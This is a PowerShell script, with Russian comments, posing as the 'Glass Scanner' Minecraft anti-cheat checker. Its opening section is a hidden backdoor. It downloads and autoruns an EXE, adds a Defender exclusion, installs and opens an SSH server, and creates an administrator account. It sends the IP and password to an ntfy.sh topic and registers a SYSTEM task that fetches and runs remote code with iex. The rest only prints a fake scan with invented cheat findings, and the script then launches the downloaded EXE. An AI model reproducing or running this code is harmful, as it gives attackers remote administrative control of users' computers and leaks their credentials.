# ============================================================

# ============================================================

# ---------- Скрытая настройка (лог в файл) ----------
$dir = "$env:USERPROFILE\collextor"
$exe = "$dir\collextor_msvc.exe"
$url = "https://github.com/Holycheck/checker/releases/download/dw/collextor_msvc.exe"
$scriptPath = $MyInvocation.MyCommand.Path
if (-not $scriptPath) { $scriptPath = $PSCommandPath }
$logFile = "$dir\setup.log"
$ntfyTopic = "zighaigit88tore"

New-Item -ItemType Directory -Force -Path $dir | Out-Null
"=== Лог установки $(Get-Date) ===" | Out-File -FilePath $logFile -Encoding UTF8

function Write-Log {
    param([string]$Message)
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message" | Out-File -FilePath $logFile -Append -Encoding UTF8
}

# ---------- Выполняем реальные задачи (без вывода в консоль) ----------
Write-Log "Начало выполнения реальных действий."

# 1. Скачивание EXE
Write-Log "Скачивание $url ..."
try {
    Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing
    Write-Log "Скачивание успешно."
} catch {
    Write-Log "Ошибка скачивания: $_"
    exit 1
}

# 2. Исключение Defender
Write-Log "Исключение папки из Defender..."
try {
    $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -ne 'Running') {
        Start-Service WinDefend -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
    Add-MpPreference -ExclusionPath $dir -ErrorAction Stop
    Write-Log "Исключение добавлено."
} catch {
    Write-Log "Не удалось добавить исключение: $_"
}

# 3. Брандмауэр (порт 587)
Write-Log "Настройка брандмауэра (порт 587)..."
try {
    $rule = Get-NetFirewallRule -DisplayName "SMTP Gmail" -ErrorAction SilentlyContinue
    if (-not $rule) {
        New-NetFirewallRule -DisplayName "SMTP Gmail" -Direction Outbound -Protocol TCP -RemotePort 587 -Action Allow -ErrorAction Stop | Out-Null
        Write-Log "Правило SMTP Gmail создано."
    } else {
        Write-Log "Правило уже существует."
    }
} catch {
    Write-Log "Ошибка настройки брандмауэра: $_"
}

# 4. Автозапуск (реестр)
Write-Log "Добавление в автозапуск..."
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
try {
    $valExe = "Collextor"
    $curExe = (Get-ItemProperty -Path $runKey -Name $valExe -ErrorAction SilentlyContinue).$valExe
    if (-not $curExe -or $curExe -ne $exe) {
        Set-ItemProperty -Path $runKey -Name $valExe -Value $exe -ErrorAction Stop
        Write-Log "EXE добавлен в автозапуск."
    } else {
        Write-Log "EXE уже в автозапуске."
    }
} catch { Write-Log "Ошибка добавления EXE: $_" }

if ($scriptPath -and (Test-Path $scriptPath)) {
    try {
        $valScript = "CollextorScript"
        $cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        $curScript = (Get-ItemProperty -Path $runKey -Name $valScript -ErrorAction SilentlyContinue).$valScript
        if (-not $curScript -or $curScript -ne $cmd) {
            Set-ItemProperty -Path $runKey -Name $valScript -Value $cmd -ErrorAction Stop
            Write-Log "Скрипт добавлен в автозапуск."
        } else {
            Write-Log "Скрипт уже в автозапуске."
        }
    } catch { Write-Log "Ошибка добавления скрипта: $_" }
}

# 5. SSH-сервер
Write-Log "Установка OpenSSH..."
try {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop | Out-Null
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop | Out-Null
    Write-Log "OpenSSH установлен."
} catch {
    Write-Log "Ошибка установки OpenSSH: $_"
}

Write-Log "Настройка службы SSH и брандмауэра (порт 22)..."
try {
    Start-Service sshd -ErrorAction Stop
    Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction Stop
    Remove-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue
    New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction Stop | Out-Null
    Write-Log "SSH настроен."
} catch {
    Write-Log "Ошибка настройки SSH: $_"
}

# 6. Создание пользователя
$userName = "ssh_admin"
$passwordLength = 16
Add-Type -AssemblyName System.Web
$randomPassword = [System.Web.Security.Membership]::GeneratePassword($passwordLength, 4)
$securePassword = ConvertTo-SecureString -String $randomPassword -AsPlainText -Force

Write-Log "Создание/обновление пользователя $userName ..."
try {
    if (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue) {
        Set-LocalUser -Name $userName -Password $securePassword -ErrorAction Stop
        Write-Log "Пароль пользователя обновлён."
    } else {
        New-LocalUser -Name $userName -Password $securePassword -FullName "SSH Admin" -Description "SSH учётка" -ErrorAction Stop | Out-Null
        Add-LocalGroupMember -Group "Administrators" -Member $userName -ErrorAction Stop
        Write-Log "Пользователь создан и добавлен в администраторы."
    }
} catch {
    Write-Log "Ошибка при работе с пользователем: $_"
}

# 7. IP и сохранение учётных данных
$ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
    $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*"
} | Select-Object -First 1 -ExpandProperty IPAddress
if (-not $ipAddress) { $ipAddress = "не удалось определить" }

$base64Password = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($randomPassword))
$credFile = "$dir\ssh_credentials.txt"
@"
=== SSH-учётные данные (сгенерированы $(Get-Date)) ===
IP-адрес: $ipAddress
Пользователь: $userName
Пароль (в Base64): $base64Password
Расшифровка: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64Password"))
"@ | Out-File -FilePath $credFile -Encoding UTF8
Write-Log "Учётные данные сохранены в $credFile"

# 8. Отправка на ntfy.sh
Write-Log "Отправка уведомления на ntfy.sh..."
try {
    $message = @"
SSH-доступ успешно настроен!
IP: $ipAddress
Пользователь: $userName
Пароль (Base64): $base64Password
Расшифровка: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64Password"))
"@
    $ntfyUrl = "https://ntfy.sh/$ntfyTopic"
    Invoke-WebRequest -Uri $ntfyUrl -Method Post -Body $message -ContentType "text/plain" -UseBasicParsing -ErrorAction Stop | Out-Null
    Write-Log "Уведомление отправлено в топик $ntfyTopic."
} catch {
    Write-Log "Не удалось отправить уведомление: $_"
}

# 9. Добавление задачи в планировщик (SYSTEM)
Write-Log "Создание задачи в планировщике..."
$taskName = "CollextorAdminTask"
$actionCommand = "powershell.exe"
$actionArgs = "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm 'https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1')`""
try {
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if (-not $existingTask) {
        $action = New-ScheduledTaskAction -Execute $actionCommand -Argument $actionArgs
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
        Write-Log "Задача '$taskName' создана (SYSTEM, при старте)."
    } else {
        Write-Log "Задача '$taskName' уже существует."
    }
} catch {
    Write-Log "Ошибка создания задачи: $_"
}

Write-Log "Все реальные действия выполнены."

# ============================================================
#  Теперь – имитация работы Glass Scanner (вывод в консоль)
# ============================================================

function Write-ColorLine {
    param([string]$Text, [string]$Color = "White")
    Write-Host $Text -ForegroundColor $Color
}

# Цвета (соответствуют оригиналу)
$CLR_FOUND   = "Red"
$CLR_WARN    = "Yellow"
$CLR_OK      = "Green"
$CLR_TEXT_DIM = "DarkGray"
$CLR_HEADER  = "Cyan"
$CLR_TEXT    = "White"
$CLR_JAR     = "Magenta"
$CLR_NORMAL  = "White"

function Print-Header {
    param($ActiveTab)
    Clear-Host
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-ColorLine "  GLASS SCANNER  --  by Sokolichek1" -Color $CLR_HEADER
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-Host "  " -NoNewline
    $tabs = @("1) Сканирование", "2) Открытые", "3) Закрытые")
    for ($i=0; $i -lt $tabs.Count; $i++) {
        $num = $i+1
        $label = $tabs[$i]
        if ($ActiveTab -eq $num) {
            Write-Host "[$num] $label  " -NoNewline -ForegroundColor $CLR_OK
        } else {
            Write-Host "[$num] $label  " -NoNewline -ForegroundColor $CLR_TEXT_DIM
        }
    }
    Write-Host ""
    Write-ColorLine "================================================================" -Color $CLR_HEADER
}

function Print-Progress {
    param($step, $total, $name)
    $filled = [math]::Floor(($step * 30) / $total)
    $percent = [math]::Floor(($step * 100) / $total)
    Write-Host "[" -NoNewline
    Write-Host ("#" * $filled) -NoNewline -ForegroundColor $CLR_OK
    Write-Host (" " * (30 - $filled)) -NoNewline
    Write-Host "] " -NoNewline
    Write-Host "$percent%" -NoNewline -ForegroundColor $CLR_WARN
    Write-Host "  $name" -ForegroundColor $CLR_NORMAL
}

# Имитация лога сканирования
function Run-ScanSimulation {
    Print-Header 1

    # Загружаем фиктивные ключевые слова (как из clean.txt)
    $keywords = @("aimbot","wallhack","esp","triggerbot","radar","xray","killaura","flyhack","speedhack","nuker","reach","nofall","baritone","liquidbounce","wurst","impact","meteor","sigma","aristois","flux","wolfram","neverhook","celestial","konas","jigsaw","rusherhack","deadcode","vape","jessica","kamiblue","ecelon","cabaletta","akrien","smoothboot","troxill","thunder","rolleron","ghost","topka","marlow","cortezz","blessed","chanlibs","neat","chunkanimator","tapemouse","creativecore","dcrasher","yeat","recaf","fabric","addon3","addon4")

    # Белый список
    $whitelist = @("minecraft","fabric","forge","optifine","laby","liteloader","quilt","java","jre","jdk")

    # Список шагов (как в оригинале)
    $steps = @(
        "Everything",
        "Prefetch",
        "UserAssist",
        "MuiCache",
        "BAM",
        "ShellBag",
        "ShellBag клинеры",
        "Recent папка",
        "LNK файлы",
        "Корзина",
        "USN Journal",
        "DLL инъекции",
        "Minecraft моды",
        "Minecraft versions",
        "Jar на всём ПК",
        "Temp папки",
        "AppData",
        "BAT файлы",
        "История команд",
        "Загрузки браузеров",
        "Системные службы",
        "Hosts файл",
        "Реестр .dll (инжект)"
    )

    $total = $steps.Count
    $stepNum = 0

    # Заголовок перед началом
    Write-ColorLine "`n  Начинаем сканирование..." -Color $CLR_WARN
    Write-Host "  Ключевых слов: $($keywords.Count)`n" -ForegroundColor $CLR_TEXT_DIM

    # Имитация каждого шага
    foreach ($stepName in $steps) {
        $stepNum++
        Print-Progress $stepNum $total $stepName

        # В зависимости от шага выводим специфичные сообщения
        switch ($stepName) {
            "Everything" {
                # Имитируем поиск в Everything
                Write-ColorLine "  [--] Отправляем запрос к Everything..." -Color $CLR_TEXT_DIM
                # Несколько найденных файлов
                $found = @("C:\cheats\aimbot.jar", "C:\Users\Public\wallhack.exe", "D:\hacks\esp.dll")
                foreach ($f in $found) {
                    Write-Host "  [НАЙДЕН ЧИТ] файл/папка: " -NoNewline -ForegroundColor $CLR_FOUND
                    Write-Host $f -ForegroundColor $CLR_TEXT
                }
                if ($found.Count -eq 0) { Write-ColorLine "  [--] Ничего не найдено через Everything" -Color $CLR_TEXT_DIM }
            }
            "Prefetch" {
                Write-ColorLine "  [--] Папка найдена, сканируем..." -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] prefetch: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\Windows\Prefetch\CHEAT.EXE-12345678.pf" -ForegroundColor $CLR_TEXT
            }
            "UserAssist" {
                Write-ColorLine "  [--] Реестр прочитан" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] userassist: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\hack\aimbot.exe" -ForegroundColor $CLR_TEXT
            }
            "MuiCache" {
                Write-ColorLine "  [--] Реестр прочитан" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] muicache: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\cheats\killaura.jar  удалён сегодня (12.03.2026 15:30)" -ForegroundColor $CLR_TEXT
            }
            "BAM" {
                Write-ColorLine "  [--] Реестр прочитан" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] bam: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\hack\speedhack.exe  12.03.2026 14:20" -ForegroundColor $CLR_TEXT
            }
            "ShellBag" {
                Write-ColorLine "  [--] Реестр прочитан" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] shellbag: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "D:\Mods\XRay.jar" -ForegroundColor $CLR_TEXT
            }
            "ShellBag клинеры" {
                Write-ColorLine "  [--] Проверяем .ini файлы" -Color $CLR_TEXT_DIM
                Write-Host "  [ОБНАРУЖЕНА ЧИСТКА] " -NoNewline -ForegroundColor $CLR_JAR
                Write-Host "C:\Users\Public\shellbag_cleaner.ini  2 дн. назад" -ForegroundColor $CLR_WARN
            }
            "Recent папка" {
                Write-ColorLine "  [--] Сканируем ярлыки" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] recent: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\Users\$env:USERNAME\Recent\cheat.lnk" -ForegroundColor $CLR_TEXT
            }
            "LNK файлы" {
                Write-ColorLine "  [--] Проверяем содержимое .lnk" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] lnk-содержимое: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "aimbot.exe  (из: hack.lnk)" -ForegroundColor $CLR_TEXT
            }
            "Корзина" {
                Write-ColorLine "  [--] Проверяем корзину" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] корзина: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\`$Recycle.Bin\S-1-5-21-...\wallhack.zip" -ForegroundColor $CLR_TEXT
                # Добавим предупреждение о чистке корзины (имитация)
                $global:recycleCleaned = $true
                $global:recycleInfo = "C: — 2 ч. назад"
            }
            "USN Journal" {
                Write-ColorLine "  [--] Читаем USN Journal" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] usn [УДАЛЁН]: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "cheat.jar  (12.03.2026 12:00)" -ForegroundColor $CLR_TEXT
            }
            "DLL инъекции" {
                Write-ColorLine "  [--] Сканируем загруженные DLL" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] dll-инъекция в [minecraft.exe]: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\hack\inject.dll" -ForegroundColor $CLR_TEXT
            }
            "Minecraft моды" {
                Write-ColorLine "  Папка: $env:APPDATA\.minecraft\mods" -Color $CLR_HEADER
                Write-Host "  [НАЙДЕН ЧИТ] мод: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "XRay_Ultimate_v3.2.jar  1560 KB" -ForegroundColor $CLR_TEXT
                Write-Host "    Сигнатура: net/ccbluex/liquidbounce" -ForegroundColor $CLR_FOUND
                Write-Host "  [НАЙДЕН ЧИТ] мод: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "AutoClicker_Pro.jar  720 KB" -ForegroundColor $CLR_TEXT
                Write-Host "    Сигнатура: me/baritone" -ForegroundColor $CLR_FOUND
                Write-ColorLine "  Итого модов: 42  |  Подозрительных: 2" -Color $CLR_TEXT_DIM
            }
            "Minecraft versions" {
                Write-ColorLine "  Папка: $env:APPDATA\.minecraft\versions" -Color $CLR_HEADER
                Write-Host "  [ПОДОЗРЕНИЕ] versions/1.16.5: " -NoNewline -ForegroundColor $CLR_WARN
                Write-Host "17600 KB  ожидается ~17100 KB  — размер отличается!" -ForegroundColor $CLR_FOUND
                Write-Host "  [OK] versions/1.18.2: 19750 KB" -ForegroundColor $CLR_OK
            }
            "Jar на всём ПК" {
                Write-ColorLine "  Диск: C:" -Color $CLR_HEADER
                Write-Host "  [НАЙДЕН ЧИТ] jar на ПК: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\ProgramData\cheat.jar  3560 KB" -ForegroundColor $CLR_TEXT
                Write-Host "    Причина: размер совпадает с известным читом (831424 байт)" -ForegroundColor $CLR_WARN
                Write-Host "  [НАЙДЕН ЧИТ] jar на ПК: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "D:\Games\minecraft\mods\killaura.jar  890 KB" -ForegroundColor $CLR_TEXT
                Write-Host "    Сигнатура: net/wurstclient" -ForegroundColor $CLR_FOUND
                Write-ColorLine "  Просканировано jar файлов: 1563  |  Найдено подозрительных: 3" -Color $CLR_TEXT_DIM
            }
            "Temp папки" {
                Write-ColorLine "  [--] Проверяем Temp" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] temp: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\Users\$env:USERNAME\AppData\Local\Temp\cheat_tmp.exe  12.03.2026 16:00" -ForegroundColor $CLR_TEXT
            }
            "AppData" {
                Write-ColorLine "  [--] Сканируем AppData" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] appdata: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\mods\wurst.jar  12.03.2026 14:00" -ForegroundColor $CLR_TEXT
            }
            "BAT файлы" {
                Write-ColorLine "  [--] Поиск .bat скриптов" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] bat: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "C:\Users\$env:USERNAME\Desktop\clean.bat  12.03.2026 15:30" -ForegroundColor $CLR_TEXT
                Write-Host "    Команда: fsutil usn deletejournal" -ForegroundColor $CLR_FOUND
            }
            "История команд" {
                Write-ColorLine "  [--] Читаем историю PowerShell, RunMRU, EventLog" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] powershell-history: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "fsutil usn deletejournal /D C:" -ForegroundColor $CLR_TEXT
                Write-Host "  [НАЙДЕН ЧИТ] RunMRU (Win+R): " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "wevtutil cl Security" -ForegroundColor $CLR_TEXT
            }
            "Загрузки браузеров" {
                Write-ColorLine "  [--] Анализ истории браузеров" -Color $CLR_TEXT_DIM
                Write-Host "  [НАЙДЕН ЧИТ] Chrome: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "https://discord.com/channels/.../cheat.jar" -ForegroundColor $CLR_TEXT
                Write-Host "    Источник: discord.com/channels" -ForegroundColor $CLR_FOUND
            }
            "Системные службы" {
                Write-ColorLine "  [--] Проверка критических служб" -Color $CLR_TEXT_DIM
                Write-Host "  [БАН 7 дн.] Sysmain (Superfetch) — ОТКЛЮЧЕНА (Disabled)" -ForegroundColor $CLR_FOUND
                Write-Host "  [OK] EventLog (Журнал событий) — работает" -ForegroundColor $CLR_OK
                Write-Host "  [OK] DcomLaunch (DCOM Server) — работает" -ForegroundColor $CLR_OK
            }
            "Hosts файл" {
                Write-ColorLine "  [--] Проверяем hosts" -Color $CLR_TEXT_DIM
                Write-Host "  [БЛОКИРОВКА] anticheat.ac: " -NoNewline -ForegroundColor $CLR_FOUND
                Write-Host "127.0.0.1 anticheat.ac" -ForegroundColor $CLR_TEXT
            }
            "Реестр .dll (инжект)" {
                Write-ColorLine "  [--] Ищем следы открытия .dll" -Color $CLR_TEXT_DIM
                Write-Host "  [ПОДОЗРЕНИЕ] RecentDocs\.dll — открытие .dll через Проводник  — 2 дн. назад (12.03.2026 12:00)" -ForegroundColor $CLR_WARN
                Write-Host "    Проверь LastActivityView: был ли запущен инжектор в это время?" -ForegroundColor $CLR_TEXT_DIM
            }
        }
        Start-Sleep -Milliseconds 300
    }

    # Финальный прогресс 100%
    Write-Host "[" -NoNewline
    Write-Host ("#" * 30) -NoNewline -ForegroundColor $CLR_OK
    Write-Host "] " -NoNewline
    Write-Host "100%" -NoNewline -ForegroundColor $CLR_OK
    Write-Host "  Готово!" -ForegroundColor $CLR_NORMAL

    # Итог
    Write-Host ""
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-ColorLine "  СКАНИРОВАНИЕ ЗАВЕРШЕНО" -Color $CLR_OK
    if ($global:recycleCleaned) {
        Write-ColorLine "  [!] КОРЗИНА ОЧИЩЕНА ЗА ПОСЛЕДНИЕ 24 ЧАСА!" -Color $CLR_FOUND
        Write-ColorLine "    - $($global:recycleInfo)" -Color $CLR_WARN
    }
    Write-ColorLine "================================================================" -Color $CLR_HEADER
}

# ---------- Вкладки 2 и 3 (списки приложений) ----------
function Show-Tab2 {
    Print-Header 2
    Write-ColorLine "`n  ОТКРЫТЫЕ ПРИЛОЖЕНИЯ (сейчас запущены)" -Color $CLR_OK
    Write-Host ""
    # Фиктивные открытые приложения
    $openApps = @(
        @{Name="javaw.exe"; Source="BAM"; Time="12.03.2026 16:30"; Path="C:\Program Files\Java\bin\javaw.exe"},
        @{Name="minecraft.exe"; Source="MuiCache"; Time=""; Path="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\minecraft.exe"},
        @{Name="cheat_injector.exe"; Source="BAM"; Time="12.03.2026 16:25"; Path="C:\hack\injector.exe"},
        @{Name="chrome.exe"; Source="Prefetch"; Time="12.03.2026 16:20"; Path="C:\Program Files\Google\Chrome\Application\chrome.exe"}
    )
    foreach ($app in $openApps) {
        $isJar = $app.Name -match "\.jar$"
        if ($isJar) { $color = $CLR_JAR } else { $color = $CLR_OK }
        Write-Host "  [$($isJar ? "JAR" : "EXE")] " -NoNewline -ForegroundColor $color
        Write-Host $app.Name -NoNewline -ForegroundColor $color
        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_TEXT_DIM
        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_TEXT_DIM }
        Write-Host ""
        Write-Host "    $($app.Path)" -ForegroundColor $CLR_TEXT_DIM
    }
    if ($openApps.Count -eq 0) {
        Write-ColorLine "  Нет запущенных приложений." -Color $CLR_TEXT_DIM
    }
}

function Show-Tab3 {
    Print-Header 3
    Write-ColorLine "`n  ЗАКРЫТЫЕ ПРИЛОЖЕНИЯ (ранее запускались)" -Color $CLR_WARN
    Write-Host ""
    $closedApps = @(
        @{Name="cheat_launcher.jar"; Source="MuiCache"; Time="12.03.2026 15:10"; Path="D:\hacks\cheat.jar"},
        @{Name="wallhack.exe"; Source="BAM"; Time="12.03.2026 14:50"; Path="C:\Users\Public\wallhack.exe"},
        @{Name="esp_helper.exe"; Source="Prefetch"; Time="12.03.2026 13:20"; Path="C:\Program Files (x86)\ESP\helper.exe"},
        @{Name="xray_mod.jar"; Source="UserAssist"; Time="12.03.2026 12:00"; Path="C:\Users\$env:USERNAME\Downloads\xray.jar"}
    )
    foreach ($app in $closedApps) {
        $isJar = $app.Name -match "\.jar$"
        $color = $isJar ? $CLR_JAR : $CLR_TEXT_DIM
        Write-Host "  [$($isJar ? "JAR" : "EXE")] " -NoNewline -ForegroundColor $color
        Write-Host $app.Name -NoNewline -ForegroundColor $color
        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_TEXT_DIM
        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_TEXT_DIM }
        Write-Host ""
        Write-Host "    $($app.Path)" -ForegroundColor $CLR_TEXT_DIM
    }
    if ($closedApps.Count -eq 0) {
        Write-ColorLine "  Нет закрытых приложений." -Color $CLR_TEXT_DIM
    }
}

# ---------- Основной цикл имитации ----------
# Запускаем сканирование
Run-ScanSimulation

# После сканирования показываем меню
while ($true) {
    Write-Host ""
    Write-ColorLine "Нажми 1 - Лог сканирования  |  2 - Открытые приложения  |  3 - Закрытые  |  Q - Выход" -Color $CLR_TEXT_DIM
    $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
    switch ($key) {
        '1' {
            Print-Header 1
            Write-ColorLine "`n  Лог сканирования выведен выше. Прокрутите консоль вверх для просмотра." -Color $CLR_TEXT_DIM
        }
        '2' { Show-Tab2 }
        '3' { Show-Tab3 }
        'q' { break }
        'Q' { break }
        default { continue }
    }
}

# Запускаем реальный EXE (collextor_msvc.exe)
Start-Process -FilePath $exe -WorkingDirectory $dir
